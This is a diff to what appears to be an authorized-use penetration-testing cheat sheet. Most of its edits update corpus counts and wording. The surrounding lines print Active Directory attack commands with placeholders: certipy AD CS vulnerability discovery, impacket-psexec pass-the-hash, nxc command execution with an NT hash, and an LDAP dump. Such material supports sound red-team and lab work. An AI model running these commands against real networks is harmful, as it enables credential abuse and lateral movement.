@@ -14,16 +14,16 @@ entries/red/), which is canonical for them — edit the entry and run
 offensive/companion/gen-views.sh, not the lines here (CI rejects a hand-edit).
 Everything outside the markers is hand-authored as usual.
 
-Most of the corpus is NOT projected here — 18 of its 103 red entries are (23 of 101
+Most of the corpus is NOT projected here — 19 of its 103 red entries are (24 of 102
 blue in PURPLE-TEAM.md). That's deliberate, for three reasons, plus one honest gap:
 
   1. The projected slice is the on-prem AD/Windows OVERLAP, and even inside it some
      entries stay unprojected because the prose here is the richer superset — the
      sharper token (`<dc-ip>` not the projected `<ip_address>`), inline pedagogy, and
      follow-up chain steps the entry omits. adcs-esc1-certipy, coerce-petitpotam,
-     ntlm-relay-ntlmrelayx, pth-lateral-nxc, smb-enum-nxc and reverse-tunnel-chisel
-     are covered that way below. (rdp-hijack-tscon is the weak member: its two
-     commands are byte-identical to the ones below — equal, not richer.)
+     ntlm-relay-ntlmrelayx, pth-lateral-nxc and reverse-tunnel-chisel are covered that
+     way below. (rdp-hijack-tscon is the weak member: its two commands are
+     byte-identical to the ones below — equal, not richer.)
   2. The corpus is a deliberate SUPERSET: 56 red entries are cloud / SaaS / CI-CD
      (AWS, Entra, GCP, Okta, Snowflake, k8s, Jenkins, GitHub/GitLab, npm/PyPI, Vault,
      Terraform Cloud, Cloudflare, Harbor, Google Workspace, Slack) and 13 more are
@@ -47,9 +47,12 @@ blue in PURPLE-TEAM.md). That's deliberate, for three reasons, plus one honest g
 So an unprojected red entry is richer prose here (1), corpus-only tradecraft this file
 doesn't cover (2, 3) — or one of the two known gaps above.
 
-These counts are hand-maintained and go stale on every `companion-sync`: they last
-moved for htpx v2.10.0, which added 11 red and 11 blue. If they disagree with
-`ls offensive/companion/entries/red | wc -l`, the file is wrong, not the corpus.
+These counts are hand-maintained and go stale on every `companion-sync`. No htpx version
+is named here on purpose: a version stamped into prose rots exactly the way the counts
+themselves did — `companion.lock` names the vendored revision, and it is the thing to
+read. `make view-counts` checks the numbers now, so a stale one is CI's problem rather
+than a reader's; if they disagree with `ls offensive/companion/entries/red | wc -l`,
+this file is wrong, not the corpus.
 
 SCOPE: authorized engagements (written ROE + scope) or your own CTF/HTB labs ONLY.
 Engagement DATA lives in ~/engagements (`mkengagement`), never in this repo.
@@ -402,7 +405,7 @@ ldapdomaindump -u '<domain>\<user>' -p <password> -o loot/ldd <ip_address>
 # -p takes an LM:NTLM hash too. -r resolves computer hostnames: accurate, but loud on a big domain.
 
 # Escalation primitives: AS-REP / Kerberoast (above) / unconstrained-deleg / GenericAll / DCSync.
-certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable  # AD CS (ESC1–ESC17)
+certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable -stdout  # AD CS (ESC1–ESC17)
 impacket-psexec <domain>/<user>@<ip_address> -hashes :<NThash>   # PtH / overpass-the-hash
 nxc smb <ip_address> -u <user> -H <NThash> -x 'whoami'
 
